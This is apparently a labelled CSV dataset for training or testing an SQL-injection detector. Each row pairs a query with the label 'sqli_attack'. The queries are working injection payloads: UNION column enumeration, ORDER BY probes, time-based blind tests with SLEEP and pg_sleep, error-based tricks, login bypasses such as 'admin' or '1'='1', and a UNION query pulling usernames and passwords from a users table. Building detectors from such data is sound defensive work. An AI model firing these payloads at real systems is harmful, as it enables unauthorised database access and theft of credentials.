"query","label"
"'1' ORDER BY 1--+'","sqli_attack"
"'""""'","sqli_attack"
"'and (select substring(@@version,1,1))='X''","sqli_attack"
"'"""" or """"""""-""""'","sqli_attack"
"'admin"""") or """"1""""=""""1""""--'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14#'","sqli_attack"
"'""""));","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29'","sqli_attack"
"'admin') or ('1'='1'#'","sqli_attack"
"'ORDER BY SLEEP(5)'","sqli_attack"
"'ORDER BY 30'","sqli_attack"
"'/'","sqli_attack"
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))--'","sqli_attack"
"'"""" or """""""" """"'","sqli_attack"
"';%00	Nullbyte'","sqli_attack"
"'%		wildcard attribute indicator'","sqli_attack"
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))--'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7--'","sqli_attack"
"'ORDER BY 2#'","sqli_attack"
"'AND 1=0 AND '%'=''","sqli_attack"
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#'","sqli_attack"
"'or 1=1/*'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8#'","sqli_attack"
"'UNION ALL SELECT 1,2'","sqli_attack"
"'' AND id IS NULL; --'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14'","sqli_attack"
"'# from wapiti'","sqli_attack"
"'#	    Hash comment'","sqli_attack"
"'' or true--'","sqli_attack"
"'ORDER BY 6--'","sqli_attack"
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11#'","sqli_attack"
"'-- or #'","sqli_attack"
"''\""""'","sqli_attack"
"'ORDER BY SLEEP(5)'","sqli_attack"
"'admin' or 1=1#'","sqli_attack"
"'ORDER BY 12--'","sqli_attack"
"'ORDER BY 23#'","sqli_attack"
"'pg_sleep(5)--'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11'","sqli_attack"
"'waitfor delay '00:00:05'#'","sqli_attack"
"'and (select substring(@@version,1,1))='M''","sqli_attack"
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))#'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#'","sqli_attack"
"'admin""""/*'","sqli_attack"
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#'","sqli_attack"
"'"""" OR 1 = 1 -- -'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28'","sqli_attack"
"'AND 1'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27'","sqli_attack"
"'));","sqli_attack"
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6#'","sqli_attack"
"'AS INJECTX WHERE 1=1 AND 1=0--'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8#'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13#'","sqli_attack"
"'# Numeric'","sqli_attack"
"'sleep(5)#'","sqli_attack"
"'' UNION SELECT null, username, password FROM users --'","sqli_attack"
"'ORDER BY 31337--'","sqli_attack"
"'WHERE 1=1 AND 1=1'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14--'","sqli_attack"
"'' or benchmark(10000000,MD5(1))#'","sqli_attack"
"'(SELECT * FROM (SELECT(SLEEP(5)))ecMj)'","sqli_attack"
"';'","sqli_attack"
"'')) or pg_sleep(5)--'","sqli_attack"
"'AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'=''","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16--'","sqli_attack"
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))#'","sqli_attack"
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))#'","sqli_attack"
"'ORDER BY 22--'","sqli_attack"
"'');","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7#'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12#'","sqli_attack"
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))--'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21'","sqli_attack"
"'AnD SLEEP(5)#'","sqli_attack"
"'UNION ALL SELECT 1'","sqli_attack"
"'ORDER BY 8'","sqli_attack"
"'admin""""or 1=1 or """"""""=""""'","sqli_attack"
"'1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15--'","sqli_attack"
"'ORDER BY 9#'","sqli_attack"
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))#'","sqli_attack"
"'AND 7506=9091 AND (5913=5913'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--'","sqli_attack"
"'\'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13#'","sqli_attack"
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18'","sqli_attack"
"'admin"""") or """"1""""=""""1'","sqli_attack"
"'ORDER BY 18'","sqli_attack"
"'pg_SLEEP(5)#'","sqli_attack"
"'ORDER BY 9#'","sqli_attack"
"'"""")) or ((""""x""""))=((""""x'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--'","sqli_attack"
"'OR 3409=3409 AND ('pytW' LIKE 'pytY'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A'))'","sqli_attack"
"'ORDER BY 24#'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4'","sqli_attack"
"'%		wildcard attribute indicator'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--'","sqli_attack"
"'pg_SLEEP(5)#'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18'","sqli_attack"
"'1)) or pg_sleep(5)--'","sqli_attack"
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))#'","sqli_attack"
"'OR x=y--'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--'","sqli_attack"
"'' AND MID(VERSION(),1,1) = '5';'","sqli_attack"
"'or benchmark(50000000,MD5(1))--'","sqli_attack"
"'"""" or """"""""&""""'","sqli_attack"
"'-- -	SQL comment'","sqli_attack"
"'ORDER BY 15#'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16--'","sqli_attack"
"''''","sqli_attack"
"'ORDER BY 4#'","sqli_attack"
"'ORDER BY 17'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8--'","sqli_attack"
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL--'","sqli_attack"
"'UNION SELECT @@VERSION,SLEEP(5),USER(),4#'","sqli_attack"
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))'","sqli_attack"
"'ORDER BY SLEEP(5)'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--'","sqli_attack"
"'IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#'","sqli_attack"
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15#'","sqli_attack"
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))--'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4'","sqli_attack"
"'Comments:'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11--'","sqli_attack"
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5'","sqli_attack"
"'ORDER BY 14#'","sqli_attack"
"'AND 7300=7300 AND ('pKlZ'='pKlY'","sqli_attack"
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))#'","sqli_attack"
"'1 AND (SELECT * FROM Users) = 1'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13'","sqli_attack"
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#'","sqli_attack"
"'1) or benchmark(10000000,MD5(1))#'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--'","sqli_attack"
"'ORDER BY 9'","sqli_attack"
"'ORDER BY 31337#'","sqli_attack"
"'OR x=x'","sqli_attack"
"'OR 1=1'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15#'","sqli_attack"
"'1' ORDER BY 1,2,3--+'","sqli_attack"
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))#'","sqli_attack"
"'-- -	SQL comment'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9#'","sqli_attack"
"'AND 7506=9091 AND ('5913=5913'","sqli_attack"
"'pg_SLEEP(5)'","sqli_attack"
"'' ''","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#'","sqli_attack"
"'#	    Hash comment'","sqli_attack"
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))--'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20'","sqli_attack"
"'RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=''","sqli_attack"
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14'","sqli_attack"
"'AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#'","sqli_attack"
"'RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=''","sqli_attack"
"'AnD SLEEP(5)--'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11--'","sqli_attack"
"'') or true--'","sqli_attack"
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17'","sqli_attack"
"'&&SLEEP(5)--'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#'","sqli_attack"
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11#'","sqli_attack"
"'UNION ALL SELECT SLEEP(5)--'","sqli_attack"
"'ORDER BY 25--'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4--'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A'))'","sqli_attack"
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6#'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20'","sqli_attack"
"'ORDER BY 22'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7--'","sqli_attack"
"'ORDER BY 23'","sqli_attack"
"'/'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21'","sqli_attack"
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'","sqli_attack"
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#'","sqli_attack"
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#'","sqli_attack"
"'ORDER BY 4#'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16'","sqli_attack"
"'""""-""""'","sqli_attack"
"'ORDER BY 2--'","sqli_attack"
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15#'","sqli_attack"
"'(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--'","sqli_attack"
"'admin"""") or """"1""""=""""1""""/*'","sqli_attack"
"'"""" or """"""""*""""'","sqli_attack"
"'ORDER BY 29'","sqli_attack"
"'ORDER BY 20--'","sqli_attack"
"'ORDER BY 16'","sqli_attack"
"'AND 1=1#'","sqli_attack"
"'"""" or sleep(5)=""""'","sqli_attack"
"'ORDER BY 1,SLEEP(5)#'","sqli_attack"
"'admin' or '1'='1'/*'","sqli_attack"
"'admin' or '1'='1'/*'","sqli_attack"
"'RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=''","sqli_attack"
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11'","sqli_attack"
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))--'","sqli_attack"
"'HAVING 1=0--'","sqli_attack"
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'","sqli_attack"
"'"""")) or ((""""x""""))=((""""x'","sqli_attack"
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15'","sqli_attack"
"'HAVING 1=0'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10#'","sqli_attack"
"'or pg_SLEEP(5)--'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8--'","sqli_attack"
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6#'","sqli_attack"
"'ORDER BY 15--'","sqli_attack"
"'WHERE 1=1 AND 1=0#'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7--'","sqli_attack"
"''=0--+'","sqli_attack"
"'OR 1=1'","sqli_attack"
"'AND (SELECT 4523 FROM(SELECT COUNT(*),CONCAT(0x716a7a6a71,(SELECT (ELT(4523=4523,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)'","sqli_attack"
"'ORDER BY 7'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#'","sqli_attack"
"'RANDOMBLOB(1000000000/2)'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5--'","sqli_attack"
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13--'","sqli_attack"
"'RANDOMBLOB(500000000/2)'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7'","sqli_attack"
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))--'","sqli_attack"
"''^''","sqli_attack"
"'admin' or '1'='1'","sqli_attack"
"'OR x=x--'","sqli_attack"
"'ORDER BY 24#'","sqli_attack"
"'ORDER BY 30#'","sqli_attack"
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))--'","sqli_attack"
"'"""" or """"""""^""""'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12#'","sqli_attack"
"'`'","sqli_attack"
"'' or ''*''","sqli_attack"
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15#'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3#'","sqli_attack"
"'WHERE 1=1 AND 1=1'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'","sqli_attack"
"'UNION ALL SELECT NULL'","sqli_attack"
"'or 1=1'","sqli_attack"
"'' UNION SELECT 1,2,3 --'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#'","sqli_attack"
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))--'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#'","sqli_attack"
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'","sqli_attack"
